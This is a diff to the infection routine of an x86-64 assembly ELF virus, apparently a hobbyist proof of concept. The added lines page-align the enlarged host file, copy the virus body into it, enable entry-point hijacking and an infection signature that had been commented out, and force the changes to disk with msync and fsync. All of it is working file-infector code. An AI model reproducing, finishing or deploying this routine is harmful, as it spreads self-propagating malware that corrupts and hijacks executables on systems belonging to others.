@@ -114,6 +114,10 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   add     rbx,  [rsp + stat.st_size]  ; host + vx
   add     rsp,  0x90                  ; free my boi stack, he aint do nun' wrong
 
+  ; align to page size
+  add     rbx,  0xFFF                 ; add page_size-1
+  and     rbx,  -0x1000
+
   xor     rsi,  rsi
   FTruncate     rdi,  rbx
   test    rax,  rax
@@ -215,28 +219,50 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   mov   rbx,  _start
   sub   rcx,  rbx           ; rcx = size V-Body
 
+  sub   rsp,  0x8
+  push  rdi
+
   mov   rsi, _start         ; source address
-  mov   rdi, [rsp+0x20]     ; destination address
+  mov   rdi, [rsp+0x28]     ; destination address
   rep   movsb
+
+  pop   rdi
+  add   rsp,  0x8
 
   ;; WRITE OLD ENTRYPOINT AT SELF >-----------------------------------------<
 
   ;; OVERWRITE ENTRYPOINT >-------------------------------------------------<
 
-  ; mov   rbx,  [rsp + 0x20]
-  ; movzx qword [rsp + elf64_hdr.e_entry],    rbx       ; patch entry
+  mov   rbx,  [rsp + 0x20]
+  mov   rcx,  [rsp]
+  mov   [rcx + elf64_hdr.e_entry],    rbx       ; patch entry
   
   ;; WRITE SIGNATURE >------------------------------------------------------<
   
-  ; lea   rbx,  [rsp]
-  ; mov   dword [rsp + 0xC], 0x534e4700
+  mov   rbx,  [rsp]
+  mov   dword [rbx + 0xC], 0x534e4700
 
   ;; OVERWRITE FILE >-------------------------------------------------------<
+
+  sub   rsp,  0x8
+  push  rdi
+
+  ; msync(addr, len, MS_SYNC) 
+  MSync [rsp + 0x10], [rsp + 0x18], MS_SYNC
+
+  pop   rdi
+  add   rsp,  0x8
+
+  test  rax,  rax
+  js    .InfectCleanUp
+
+  ; fsync(fd) - just to make sure
+  FSync rdi
 
   ;; EXEC PAYLOAD (PRINT STDOUT) >------------------------------------------<
 
   .InfectCleanUp:
-  MUnMap  rax, rbx
+  MUnMap  [rsp], [rsp + 0x8]
 
   .InfectExit:
   xor     rax,  rax
